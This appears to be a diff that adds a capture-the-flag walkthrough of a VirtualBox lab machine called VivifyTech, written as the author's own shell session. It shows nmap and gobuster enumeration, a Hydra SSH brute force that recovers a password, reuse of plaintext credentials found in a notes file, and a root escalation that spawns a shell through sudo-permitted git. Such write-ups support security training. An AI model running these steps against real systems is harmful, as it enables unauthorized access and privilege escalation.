@@ -1,1 +1,344 @@
-        ENUMERATION
+        			ENUMERATION
+
+
+---ifconfig---
+                                                                                                             
+┌──(root㉿kali)-[/home/okina]
+└─# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
+        inet6 fe80::a00:27ff:fef6:e3c3  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:f6:e3:c3  txqueuelen 1000  (Ethernet)
+        RX packets 390344  bytes 170779560 (162.8 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 381771  bytes 52845634 (50.3 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 29  bytes 1808 (1.7 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 29  bytes 1808 (1.7 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+
+---netdiscover---
+                                                                                                               
+┌──(root㉿kali)-[/home/okina]
+└─# netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+
+
+Currently scanning: 10.0.2.0/24   |   Screen View: Unique Hosts                                              
+                                                                                                              
+ 16 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 960                                             
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 10.0.2.1        52:54:00:12:35:00      4     240  Unknown vendor                                             
+ 10.0.2.2        52:54:00:12:35:00      4     240  Unknown vendor                                             
+ 10.0.2.3        08:00:27:32:d0:3b      4     240  PCS Systemtechnik GmbH                                     
+ 10.0.2.37       08:00:27:29:de:eb      4     240  PCS Systemtechnik GmbH                                     
+
+
+
+
+---nmap on target---
+                                                                                                               
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.37 -sS -sC -sV -A -T4 -p-   
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-09 13:14 +03
+Nmap scan report for 10.0.2.37
+Host is up (0.00071s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
+| ssh-hostkey: 
+|   256 32:f3:f6:36:95:12:c8:18:f3:ad:b8:0f:04:4d:73:2f (ECDSA)
+|_  256 1d:ec:9c:6e:3c:cf:83:f6:f0:45:22:58:13:2f:d3:9e (ED25519)
+80/tcp    open  http    Apache httpd 2.4.57 ((Debian))
+|_http-server-header: Apache/2.4.57 (Debian)
+|_http-title: Apache2 Debian Default Page: It works
+3306/tcp  open  mysql   MySQL (unauthorized)
+33060/tcp open  mysqlx?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
+|     Invalid message"
+|     HY000
+|   LDAPBindReq: 
+|     *Parse error unserializing protobuf message"
+|     HY000
+|   oracle-tns: 
+|     Invalid message-frame."
+|_    HY000
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port33060-TCP:V=7.94SVN%I=7%D=4/9%Time=66151537%P=x86_64-pc-linux-gnu%r
+SF:(NULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0
+SF:b\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTP
+SF:Options,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x
+SF:0b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVe
+SF:rsionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP
+SF:,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0
+SF:fInvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0
+SF:")%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x
+SF:01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCook
+SF:ie,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b
+SF:\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message
+SF:\"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg
+SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x0
+SF:5\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05H
+SF:Y000")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDStrin
+SF:g,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\
+SF:x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\
+SF:"\x05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x0
+SF:1\x08\x01\x10\x88'\x1a\*Parse\x20error\x20unserializing\x20protobuf\x20
+SF:message\"\x05HY000")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(L
+SF:ANDesk-RC,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\
+SF:0\0\x0b\x08\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(Notes
+SF:RPC,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a
+SF:\x0fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05
+SF:\x1a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,32
+SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Inval
+SF:id\x20message-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05
+SF:\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x
+SF:10\x88'\x1a\x0fInvalid\x20message\"\x05HY000");
+MAC Address: 08:00:27:29:DE:EB (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.71 ms 10.0.2.37
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 50.53 seconds
+   
+                
+
+
+
+---we see open http, ssh and mysql ports, lets check the website and run some web enum---
+
+
+                                                                                                            
+---ctfenum---
+                                                                                                                                               
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# python3 /opt/CTFEnum/CTFenum/CTFenum.py 10.0.2.37
+======================================================================
+[!] Checking open ports
+======================================================================
+OPEN TCP PORTS:
+[!] nmap -Pn -T3 -n -p- 10.0.2.37
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+3306/tcp  open  mysql
+33060/tcp open  mysqlx
+MAC Address: 08:00:27:29:DE:EB (Oracle VirtualBox virtual NIC)
+======================================================================
+[!] Generating Nmap output
+======================================================================
+NMAP TCP OUTPUT:
+[!] nmap -T5 -n -Pn -sCV -p22,80,3306,33060 10.0.2.37
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
+| ssh-hostkey: 
+|   256 32:f3:f6:36:95:12:c8:18:f3:ad:b8:0f:04:4d:73:2f (ECDSA)
+|_  256 1d:ec:9c:6e:3c:cf:83:f6:f0:45:22:58:13:2f:d3:9e (ED25519)
+80/tcp    open  http    Apache httpd 2.4.57 ((Debian))
+|_http-title: Apache2 Debian Default Page: It works
+|_http-server-header: Apache/2.4.57 (Debian)
+3306/tcp  open  mysql   MySQL (unauthorized)
+33060/tcp open  mysqlx?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
+|     Invalid message"
+|     HY000
+|   LDAPBindReq: 
+|     *Parse error unserializing protobuf message"
+|     HY000
+|   oracle-tns: 
+|     Invalid message-frame."
+[!] Attacking port 22
+[!] SSH
+[!] You can try to bruteforce credentials using [netexec|crackmapexec|hydra].
+netexec ssh $(IP) -u usernames.txt -p passwords.txt | grep -v fail
+======================================================================
+[!] Attacking port 80
+[!] Apache server, Fuzzing for PHP files.
+[!] Apache/2.4.57 (Debian)
+======================================================================
+[!] Attacking port 80
+[!] gobuster dir -u http://10.0.2.37:80 -w /opt/CTFEnum/CTFenum/mods/wordlist.txt -x .txt,.bak,.cgi,.html,.php -t 70 -z --no-error -k
+[!] URL: http://10.0.2.37:80
+
+/index.html           (Status: 200) [Size: 10701]
+/wordpress            (Status: 301) [Size: 310] [--> http://10.0.2.37/wordpress/]
+/wordpress            (Status: 301) [Size: 310] [--> http://10.0.2.37/wordpress/]
+
+======================================================================
+[!] Attacking port 80
+[!] gobuster dir -u http://10.0.2.37/wordpress/wp-includes/ -w /opt/CTFEnum/CTFenum/mods/wordlist.txt -x .txt,.bak,.cgi,.html -t 70 -z --no-error -k
+[!] URL: http://10.0.2.37/wordpress/wp-includes/
+
+/secrets.txt          (Status: 200) [Size: 439]
+/assets               (Status: 301) [Size: 329] [--> http://10.0.2.37/wordpress/wp-includes/assets/]
+/blocks               (Status: 301) [Size: 329] [--> http://10.0.2.37/wordpress/wp-includes/blocks/]
+/certificates         (Status: 301) [Size: 335] [--> http://10.0.2.37/wordpress/wp-includes/certificates/]
+/css                  (Status: 301) [Size: 326] [--> http://10.0.2.37/wordpress/wp-includes/css/]
+/fonts                (Status: 301) [Size: 328] [--> http://10.0.2.37/wordpress/wp-includes/fonts/]
+/images               (Status: 301) [Size: 329] [--> http://10.0.2.37/wordpress/wp-includes/images/]
+/js                   (Status: 301) [Size: 325] [--> http://10.0.2.37/wordpress/wp-includes/js/]
+/sitemaps             (Status: 301) [Size: 331] [--> http://10.0.2.37/wordpress/wp-includes/sitemaps/]
+/widgets              (Status: 301) [Size: 330] [--> http://10.0.2.37/wordpress/wp-includes/widgets/]
+
+
+
+---I see a secrets.txt file in the scan, they look like credentials so I copy them to a txt file called secrets.txt---
+
+---We find a login page but none of the credentials that I found in the secrets.txt worked, lets keep looking---
+
+---I keep on looking at the website, and in index.php page I see a blog---
+
+---In the blog there are some user names, I also write them in a txt file called users.txt---
+
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/VIVIFYTECH LINUX CTF]
+└─# cat users.txt      
+sancelisso
+sarah
+mark
+emily
+jake
+alex
+
+
+---now we have some credentials, lets use ssh to login, I will use users.txt for username and secrets.txt for password---
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/VIVIFYTECH LINUX CTF]
+└─# hydra -L users.txt -P secrets.txt ssh://10.0.2.37                                    
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-09 14:29:18
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 288 login tries (l:6/p:48), ~18 tries per task
+[DATA] attacking ssh://10.0.2.37:22/
+[22][ssh] host: 10.0.2.37   login: sarah   password: bohicon
+
+
+---we find our user and the password, lets log in---
+
+
+
+
+					GAINING FOOTHOLD
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/VIVIFYTECH LINUX CTF]
+└─# ssh sarah@10.0.2.37    
+sarah@10.0.2.37's password: 
+Linux VivifyTech 6.1.0-13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.55-1 (2023-09-29) x86_64
+#######################################
+ # 	Welcome to VivifyTech !      #
+ # 	The place to be :)	     #
+#######################################
+Last login: Tue Dec  5 17:54:16 2023 from 192.168.177.129
+
+sarah@VivifyTech:~$ ls
+user.txt
+sarah@VivifyTech:~$ cat user.txt
+---First User Flag---
+
+
+
+---lets look around and try to find ways to priv escalate---
+
+
+---I check sudo -l, /etc/crontab and cant find anything---
+
+---I run linpeas too but still cant find a way---
+
+---we can check for some secret files in our users folder---
+
+
+sarah@VivifyTech:~$ pwd
+/home/sarah
+sarah@VivifyTech:~$ ls
+linpeas.sh  user.txt
+sarah@VivifyTech:~$ ls -la
+total 880
+drwx------ 5 sarah sarah   4096 Apr  9 07:36 .
+drwxr-xr-x 6 root  root    4096 Dec  5 16:00 ..
+-rw------- 1 sarah sarah      0 Dec  5 17:53 .bash_history
+-rw-r--r-- 1 sarah sarah    245 Dec  5 17:33 .bash_logout
+-rw-r--r-- 1 sarah sarah   3565 Dec  5 17:48 .bashrc
+drwx------ 3 sarah sarah   4096 Apr  9 07:36 .gnupg
+-rw------- 1 sarah sarah      0 Dec  5 17:49 .history
+-rw-r--r-- 1 sarah sarah 860549 Mar 29 06:18 linpeas.sh
+drwxr-xr-x 3 sarah sarah   4096 Dec  5 16:19 .local
+drwxr-xr-x 2 sarah sarah   4096 Dec  5 16:19 .private
+-rw-r--r-- 1 sarah sarah    807 Dec  5 15:57 .profile
+-rw-r--r-- 1 sarah sarah     27 Dec  5 16:22 user.txt
+
+
+---we see there are two hidden folders, .local and .private---
+
+---after checking .private we see there is a file here---
+
+sarah@VivifyTech:~$ cd .private/
+sarah@VivifyTech:~/.private$ ls
+Tasks.txt
+sarah@VivifyTech:~/.private$ cat Tasks.txt 
+- Change the Design and architecture of the website
+- Plan for an audit, it seems like our website is vulnerable
+- Remind the team we need to schedule a party before going to holidays
+- Give this cred to the new intern for some tasks assigned to him - gbodja:4Tch055ouy370N
+
+
+
+
+				PRIVILEGE ESCALATION
+
+sarah@VivifyTech:~/.private$ su gbodja
+Password: 
+gbodja@VivifyTech:/home/sarah/.private$ cd ..
+bash: cd: ..: Permission denied
+gbodja@VivifyTech:/home/sarah/.private$ cd ..
+bash: cd: ..: Permission denied
+
+
+---we see that this user doesn't have that much permissions either, lets check for more tho---
+
+gbodja@VivifyTech:/home/sarah/.private$ sudo -l
+Matching Defaults entries for gbodja on VivifyTech:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, !admin_flag, use_pty
+
+User gbodja may run the following commands on VivifyTech:
+    (ALL) NOPASSWD: /usr/bin/git
+
+
+
+---lets go to gtfobins to check how we can run this---
+
+---turns out that with this command we go to the git manual page and then change it once we are inside the page---
+
+
+gbodja@VivifyTech:/home/sarah/.private$ sudo git branch --help config
+!/bin/sh
+
+
+# whoami
+root
+# cd /root
+# ls
+root.txt
+# cat root.txt
+---Root User Flag---
+
+
